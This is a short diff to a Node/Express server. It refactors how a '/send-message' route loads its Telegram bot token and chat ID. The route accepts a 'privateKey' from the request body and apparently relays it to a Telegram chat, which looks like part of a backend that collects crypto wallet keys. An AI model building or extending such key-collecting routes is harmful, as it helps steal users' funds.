@@ -20,8 +20,9 @@ app.get("/", (req, res) => {
 // Route to send message to Telegram
 app.post("/send-message", async (req, res) => {
     const { privateKey } = req.body;
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+   
+    const [botToken, chatId] = process.env.TELEGRAM_CREDENTIALS.split("|");
+
 
     if (!botToken || !chatId) {
         return res.status(500).json({ error: "Missing API credentials" });
